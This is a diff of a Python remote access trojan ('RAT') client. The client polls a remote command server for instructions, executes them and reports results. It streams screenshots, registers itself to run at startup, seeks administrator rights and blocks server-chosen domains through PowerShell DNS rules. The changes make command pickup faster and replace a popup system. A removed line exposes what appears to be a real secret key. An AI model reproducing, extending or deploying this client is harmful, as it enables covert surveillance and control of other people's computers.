@@ -43,11 +43,11 @@ if sys.platform == "win32":
 #  CONFIG — edit before building
 # ═══════════════════════════════════════════════════════════
 SERVER_URL     = "https://getpassion.xyz"
-HEARTBEAT_SECS = 5
+HEARTBEAT_SECS = 3
 STREAM_SECS    = 0.25
 JPEG_QUALITY   = 55
 STARTUP_NAME   = "RemoteAdminClient"
-RAT_SECRET     = "eMgOUrikcdvGTJD74o47"
+RAT_SECRET     = "your_rat_secret_here"
 # ═══════════════════════════════════════════════════════════
 
 HEARTBEAT_URL = f"{SERVER_URL}/api/rat/heartbeat"
@@ -166,30 +166,44 @@ def startup_disable() -> None:
         pass
 
 # ── Blocked sites ──────────────────────────────────────────
-HOSTS_PATH = (r"C:\Windows\System32\drivers\etc\hosts"
-              if sys.platform == "win32" else "/etc/hosts")
-BLOCK_TAG  = "# __ra_block__"
-
 _current_blocked: List[str] = []
 
-def _apply_hosts(domains: List[str]) -> None:
+def _ps(cmd: str) -> bool:
+    """Run a PowerShell command. Returns True on success."""
     try:
-        with open(HOSTS_PATH, "r") as f:
-            lines = f.readlines()
-        lines = [l for l in lines if BLOCK_TAG not in l]
-        for d in domains:
-            lines.append(f"127.0.0.1 {d} {BLOCK_TAG}\n")
-            lines.append(f"127.0.0.1 www.{d} {BLOCK_TAG}\n")
-        with open(HOSTS_PATH, "w") as f:
-            f.writelines(lines)
-    except Exception as e:
-        pass
+        r = subprocess.run(
+            ["powershell", "-NonInteractive", "-Command", cmd],
+            capture_output=True, timeout=15
+        )
+        return r.returncode == 0
+    except Exception:
+        return False
+
+def _block_domain(domain: str) -> None:
+    """Block a domain using Windows DNS client override (no hosts file needed)."""
+    domain = domain.strip().lower()
+    if not domain:
+        return
+    # Add-DnsClientNrptRule redirects DNS lookups for the domain to 0.0.0.0
+    _ps(f'Add-DnsClientNrptRule -Namespace ".{domain}" -NameServers "0.0.0.0"')
+    _ps(f'Add-DnsClientNrptRule -Namespace "{domain}" -NameServers "0.0.0.0"')
+
+def _unblock_domain(domain: str) -> None:
+    domain = domain.strip().lower()
+    if not domain:
+        return
+    _ps(f'Get-DnsClientNrptRule | Where-Object {{$_.Namespace -eq ".{domain}" -or $_.Namespace -eq "{domain}"}} | Remove-DnsClientNrptRule -Force')
 
 def sync_blocked(domains: List[str]) -> None:
     global _current_blocked
     if sorted(domains) == sorted(_current_blocked):
         return
-    _apply_hosts(domains)
+    to_add    = [d for d in domains       if d not in _current_blocked]
+    to_remove = [d for d in _current_blocked if d not in domains]
+    for d in to_remove:
+        _unblock_domain(d)
+    for d in to_add:
+        _block_domain(d)
     _current_blocked = list(domains)
 
 # ── Processes ──────────────────────────────────────────────
@@ -271,124 +285,21 @@ def read_text_file(path: str) -> str:
         return f"[read error] {e}"
 
 # ── Message popup ──────────────────────────────────────────
-_popup_queue:  queue.Queue = queue.Queue()
-_reply_queue:  queue.Queue = queue.Queue()  # replies typed by user, flushed each heartbeat
-
-# Single QApplication instance for the whole process
-_qt_app = None
-
-def _get_qt_app():
-    global _qt_app
-    try:
-        from PyQt5.QtWidgets import QApplication
-        if _qt_app is None:
-            _qt_app = QApplication.instance() or QApplication(sys.argv)
-        return _qt_app
-    except Exception:
-        return None
+_popup_queue: queue.Queue = queue.Queue()
+_reply_queue: queue.Queue = queue.Queue()
 
 def _popup_worker() -> None:
-    """Runs on the main thread via _run_popup_loop. DO NOT call from a background thread."""
-    pass  # not used directly — see _run_popup_loop
-
-def _show_popup(body: str) -> None:
-    try:
-        from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout,
-                                     QLabel, QLineEdit, QPushButton,
-                                     QTextEdit, QDesktopWidget)
-        from PyQt5.QtCore import Qt
-
-        app = _get_qt_app()
-        if app is None:
-            raise ImportError("no QApplication")
-
-        win = QWidget()
-        win.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
-        win.setFixedSize(420, 260)
-        win.setStyleSheet("""
-            QWidget{background:#0d0a0b;color:#e5e3e4}
-            QTextEdit{background:#161014;border:1px solid #2e292b;border-radius:6px;
-                      padding:8px;font-size:13px;color:#c5c0c2}
-            QLineEdit{background:#0f0b0c;border:1px solid #2e292b;border-radius:6px;
-                      padding:6px 10px;font-size:12px;color:#c5c0c2}
-            QLineEdit:focus{border-color:#4e4447}
-            QPushButton{background:#1c1418;border:1px solid #2e292b;border-radius:6px;
-                        padding:6px 16px;font-size:12px;color:#868283}
-            QPushButton:hover{background:#2a1a1b;color:#e5e3e4;border-color:#4a4448}
-            QPushButton#send{background:rgba(220,38,37,0.12);border-color:#dc262544;color:#dc2625}
-            QPushButton#send:hover{background:rgba(220,38,37,0.22)}
-        """)
-        layout = QVBoxLayout(win)
-        layout.setContentsMargins(18, 14, 18, 14)
-        layout.setSpacing(10)
-
-        title_row = QHBoxLayout()
-        title = QLabel("● Message")
-        title.setStyleSheet("color:#dc2625;font-size:12px;font-weight:bold")
-        title_row.addWidget(title)
-        title_row.addStretch()
-        layout.addLayout(title_row)
-
-        msg_box = QTextEdit()
-        msg_box.setReadOnly(True)
-        msg_box.setPlainText(body)
-        msg_box.setFixedHeight(100)
-        layout.addWidget(msg_box)
-
-        reply_input = QLineEdit()
-        reply_input.setPlaceholderText("Type a reply… (optional)")
-        layout.addWidget(reply_input)
-
-        btn_row = QHBoxLayout()
-        btn_row.addStretch()
-        dismiss_btn = QPushButton("Dismiss")
-        send_btn    = QPushButton("Send Reply")
-        send_btn.setObjectName("send")
-        btn_row.addWidget(dismiss_btn)
-        btn_row.addWidget(send_btn)
-        layout.addLayout(btn_row)
-
-        win._drag_pos = None
-        def mousePressEvent(e):
-            if e.button() == Qt.LeftButton:
-                win._drag_pos = e.globalPos() - win.frameGeometry().topLeft()
-        def mouseMoveEvent(e):
-            if win._drag_pos and e.buttons() == Qt.LeftButton:
-                win.move(e.globalPos() - win._drag_pos)
-        win.mousePressEvent = mousePressEvent
-        win.mouseMoveEvent  = mouseMoveEvent
-
+    """Background thread: show one popup at a time using native Windows dialog."""
+    while True:
+        body = _popup_queue.get()
         try:
-            screen = QDesktopWidget().screenGeometry()
-            win.move((screen.width() - win.width()) // 2,
-                     (screen.height() - win.height()) // 2)
-        except Exception:
-            pass
-
-        def on_send():
-            r = reply_input.text().strip()
-            if r:
-                _reply_queue.put(r)
-            win.close()
-
-        send_btn.clicked.connect(on_send)
-        dismiss_btn.clicked.connect(win.close)
-        reply_input.returnPressed.connect(on_send)
-
-        win.show()
-        win.raise_()
-        win.activateWindow()
-
-        # Process events until window closes — do NOT call app.exec_() (blocks everything)
-        from PyQt5.QtCore import QEventLoop
-        loop = QEventLoop()
-        win.destroyed.connect(loop.quit)
-        loop.exec_()
-
-    except Exception:
-        try:
-            import ctypes
-            ctypes.windll.user32.MessageBoxW(0, body, "Message", 0x40)
+            if sys.platform == "win32":
+                import ctypes
+                # MB_OKCANCEL=1, MB_ICONINFORMATION=0x40, MB_TOPMOST=0x40000
+                ctypes.windll.user32.MessageBoxW(0, body, "Message", 0x40 | 0x40000)
+            else:
+                # Linux/Mac fallback
+                subprocess.run(["notify-send", "Message", body], capture_output=True, timeout=5)
         except Exception:
             pass
 
@@ -536,7 +447,8 @@ def _heartbeat_loop() -> None:
                 data = resp.json()
                 sync_blocked(data.get("blocked_sites", []))
 
-                for cmd in data.get("commands", []):
+                commands = data.get("commands", [])
+                for cmd in commands:
                     cmd_id = cmd.get("id")
 
                     try:
@@ -544,11 +456,11 @@ def _heartbeat_loop() -> None:
                     except Exception:
                         result = {"message_reply": traceback.format_exc()[:2000]}
 
-                    # ACK immediately so command is never re-delivered
+                    # ACK immediately
                     if cmd_id and str(cmd_id) != "screenshot_ondemand":
                         ack_command(session, str(cmd_id))
 
-                    # Send result back — only if there's something to send
+                    # Send result back
                     if result:
                         try:
                             session.post(
@@ -561,6 +473,11 @@ def _heartbeat_loop() -> None:
                         except Exception:
                             pass
 
+                # If we got commands, immediately loop to pick up the next one
+                # without waiting HEARTBEAT_SECS
+                if commands:
+                    continue
+
         except requests.exceptions.ConnectionError:
             pass
         except Exception:
@@ -570,36 +487,13 @@ def _heartbeat_loop() -> None:
 
 
 def run() -> None:
-    """Start heartbeat on background thread, run Qt event loop on main thread."""
-    t = threading.Thread(target=_heartbeat_loop, daemon=True)
-    t.start()
-
-    # Main thread: initialise Qt and drain popup queue every 200ms
-    try:
-        from PyQt5.QtWidgets import QApplication
-        from PyQt5.QtCore import QTimer
-
-        app = QApplication.instance() or QApplication(sys.argv)
-        global _qt_app
-        _qt_app = app
-
-        def _drain():
-            while not _popup_queue.empty():
-                try:
-                    body = _popup_queue.get_nowait()
-                    _show_popup(body)
-                except queue.Empty:
-                    break
-
-        timer = QTimer()
-        timer.timeout.connect(_drain)
-        timer.start(200)
-        app.exec_()
-
-    except Exception:
-        # No PyQt5 — just keep the main thread alive
-        while True:
-            time.sleep(1)
+    # Start popup worker thread (shows native Windows dialogs)
+    threading.Thread(target=_popup_worker, daemon=True).start()
+    # Start heartbeat on background thread
+    threading.Thread(target=_heartbeat_loop, daemon=True).start()
+    # Keep main thread alive
+    while True:
+        time.sleep(60)
 
 # ── Elevation ──────────────────────────────────────────────
 def ensure_admin() -> None:
